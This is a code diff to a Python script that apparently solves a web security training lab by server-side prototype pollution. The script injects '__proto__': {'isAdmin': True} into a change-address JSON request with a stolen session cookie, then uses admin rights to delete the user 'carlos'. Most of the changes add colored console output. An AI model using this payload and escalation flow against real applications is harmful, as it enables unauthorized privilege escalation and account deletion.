@@ -8,6 +8,14 @@ import json
 from time import sleep
 
 import requests
+from rich.console import Console
+from rich.text import Text
+
+def pretty_print(t,color):
+    text = Text()
+    text.append(t,style=f"bold {color}")
+    return text
+
 
 def login(driver,LAB_URL):
     driver.get(f"{LAB_URL}/login")
@@ -43,11 +51,11 @@ def manipulate_json(json_response,session_id):
     malicious_json["__proto__"] = {"isAdmin": True}
     return malicious_json
 
-def send_POST_to_change_address(malicious_json,cookie,LAB_URL):
+def send_POST_to_change_address(malicious_json,cookie,LAB_URL,console):
     endpoint_POST = f"{LAB_URL}/my-account/change-address"
     headers = {"Cookie": f"session={cookie}"}
     response = requests.post(url=endpoint_POST, data=json.dumps(malicious_json), headers=headers)
-    print(response.json())
+    console.print(pretty_print(f"Injected Response: {str(response.json())}","yellow"))
     return response
 
 def go_to_admin_panel(driver):
@@ -57,8 +65,10 @@ def go_to_admin_panel(driver):
 def delete_carlos(driver):
     delete_buttons = driver.find_elements("xpath", '//*[contains(text(), "Delete")]')
     delete_buttons[1].click()
-driver = webdriver.Chrome()
+
 def main(lab_url: str):
+    c = Console()
+    driver = webdriver.Chrome()
     lab_url=lab_url.rstrip("/")
     print(lab_url)
     print(f"Hello {lab_url}")
@@ -80,19 +90,21 @@ def main(lab_url: str):
             if request.response and "change-address" in request.url:
                 URL_BACKEND = request.url
         cookie = driver.get_cookie("session")["value"]
-        print(f"Session Cookie : {cookie} ")
+        #print(f"Session Cookie : {cookie} ")
         headers = {"Cookie": f"session={cookie}"}
         # Quando useremo il proxy saremo in grado di prendere la POST e manovrarla
         # TODO: Typer, Proxy
         tags['sessionId'] = sessionId
         request_to_back_end = requests.post(URL_BACKEND, data=json.dumps(tags), headers=headers)
         json_risposta = request_to_back_end.json()
-        print("JSON RISPOSTA: " + str(json_risposta))
+        t1 = pretty_print(f"Back-end response: {str(json_risposta)}","green")
+        c.print(t1)
         sleep(3)
         json_malevolo = manipulate_json(json_risposta, sessionId)
-        print("JSON MALEVOLO" + str(json_malevolo))
+        t2 = pretty_print(f"Malicious payload: {str(json_malevolo)}","red")
+        c.print(t2)
         sleep(2)
-        send_POST_to_change_address(json_malevolo, cookie, lab_url)
+        send_POST_to_change_address(json_malevolo, cookie, lab_url,c)
         sleep(1)
         driver.refresh()
         sleep(2)
